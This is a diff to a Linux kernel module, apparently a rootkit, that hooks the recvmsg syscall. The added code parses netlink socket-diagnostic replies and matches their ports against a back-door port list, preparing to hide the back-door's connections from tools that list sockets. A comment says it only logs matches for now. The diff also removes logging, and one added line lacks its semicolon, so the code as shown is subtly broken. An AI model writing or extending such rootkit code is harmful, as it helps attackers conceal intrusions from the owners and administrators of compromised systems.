@@ -519,7 +519,7 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
-	// Copy user-space msghdr to us
+	/** copy message to kernel-space */
 	if (copy_from_user(&msg_kernel, umsg, sizeof(msg_kernel))) {
 		pr_err("Failed to copy msghdr from user space\n");
 		return ret;
@@ -531,16 +531,16 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
+	/** __user msg_iov */
 	if (copy_from_user(&iov_kernel, msg_kernel.msg_iov,
 			   sizeof(iov_kernel))) {
 		pr_err("Failed to copy iovec from user space\n");
 		return ret;
 	}
 
+	/** iov_base can be null */
 	if (!iov_kernel.iov_base ||
 	    !access_ok(iov_kernel.iov_base, iov_kernel.iov_len)) {
-		pr_err("Invalid or inaccessible iov_base pointer: %p\n",
-		       iov_kernel.iov_base);
 		return ret;
 	}
 
@@ -550,26 +550,25 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
-	// Copy the data from user-space
+	/** __user iov_base */
 	if (copy_from_user(kbuf, iov_kernel.iov_base, iov_kernel.iov_len)) {
 		pr_err("Failed to copy data from user space\n");
 		kfree(kbuf);
 		return ret;
 	}
 
-	// Iterate over each nlmsghdr in the buffer
 	nlh = (struct nlmsghdr *)kbuf;
 	remaining_len = iov_kernel.iov_len;
 
 	for (; NLMSG_OK(nlh, remaining_len);
 	     nlh = NLMSG_NEXT(nlh, remaining_len)) {
 		struct inet_diag_msg *idm = NLMSG_DATA(nlh);
-		int sport = ntohs(idm->id.idiag_sport);
-		int dport = ntohs(idm->id.idiag_dport);
-		prinfo("nlmsg_len: %u sport=%d dport=%d\n", nlh->nlmsg_len,
-		       sport, dport);
 
-		//XXX: check if need to handle attributes
+		/** It is dest port for us, but for back-door it is source */
+		if (kv_bd_search_iph_source_port(idm->id.idiag_dport)) {
+			/** Just print and do nothing else, for now */
+			prinfo("netlink: Got match for port %d\n", ntohs(idm->id.idiag_dport))
+		}
 	}
 
 	kfree(kbuf);
